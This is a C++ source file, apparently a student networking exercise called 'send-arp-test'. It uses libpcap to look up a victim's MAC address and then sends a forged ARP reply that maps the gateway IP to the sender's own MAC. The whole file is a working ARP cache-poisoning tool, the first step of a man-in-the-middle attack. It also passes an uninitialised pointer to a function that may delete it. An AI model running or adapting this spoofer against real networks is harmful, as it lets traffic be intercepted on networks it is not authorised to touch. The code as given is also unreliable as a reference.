#include "main.h"


/*********************************/
void usage();

EthArpPacket *myArpPacket(EthArpPacket *p,
						Mac dmac,
						Mac smac,
						uint16_t op, 
						Ip sip, 
						Mac tmac,
						Ip tip);

Mac getVictimMac(pcap_t* handle, 
				Ip dip, 
				Ip sip, 
				Mac smac);
/*********************************/

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket *packet;
	Mac myMac = Mac(get_mac_address());
	Ip myIp = Ip(get_ip_address(argv[1]));

	packet = myArpPacket(packet,
						Mac("ff:ff:ff:ff:ff:ff"),
						myMac,
						ArpHdr::Request,
						myIp, //MyIP
						Mac("00:00:00:00:00:00"),
						Ip(argv[2])); //victim - sender

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	Mac victimMac = getVictimMac(handle, Ip(argv[2]), myIp, myMac);

	packet = myArpPacket(packet,
						victimMac,
						myMac,
						ArpHdr::Reply,
						Ip(argv[3]), // gate
						victimMac,
						Ip(argv[2])); //victim - sender

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	delete packet;
	pcap_close(handle);
}

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 10.1.1.2 10.1.1.3 \n");
}

EthArpPacket *myArpPacket(EthArpPacket *p,
						Mac dmac,
						Mac smac,
						uint16_t op, 
						Ip sip, 
						Mac tmac,
						Ip tip) {
	if(p != NULL){
		delete p;
		p = NULL;
	}
	EthArpPacket *packet = new EthArpPacket;

	packet->eth_.dmac_ = dmac;
	packet->eth_.smac_ = smac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(op);
	packet->arp_.smac_ = smac;
	packet->arp_.sip_ = htonl(sip);
	packet->arp_.tmac_ = tmac;
	packet->arp_.tip_ = htonl(tip);

	return packet;
}

Mac getVictimMac(pcap_t* handle, Ip dip, Ip sip, Mac smac){
	while(true){
		struct pcap_pkthdr* pkthdr;
		const u_char* packet;
        int res = pcap_next_ex(handle, &pkthdr, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket* etharp = (struct EthArpPacket*)packet;
		if(etharp->eth_.type_ != htons(EthHdr::Arp)
		|| etharp->arp_.op_ != htons(ArpHdr::Reply)
		|| etharp->arp_.sip_ != htonl(dip))
			continue; 
		return etharp->eth_.smac();
	}
	return 0; 
}